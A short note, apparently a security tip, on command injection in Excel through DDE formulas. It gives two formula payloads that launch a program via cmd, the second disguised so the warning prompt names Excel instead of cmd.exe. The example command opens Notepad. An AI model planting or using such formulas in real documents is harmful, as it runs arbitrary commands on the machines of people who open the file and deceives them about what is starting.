Command injection in Exel documents is as simple as:
=cmd|'/c notepad.exe'!_xlbgnm.A1

This will launch a prompt to start the application, however, it can be masked slightly by using this modified formula:
=EXCEL|'\..\..\..\Windows\System32\cmd.exe /c notepad.exe'!_xlbgnm.A1

should show: "Start application EXCEL.EXE -X"?
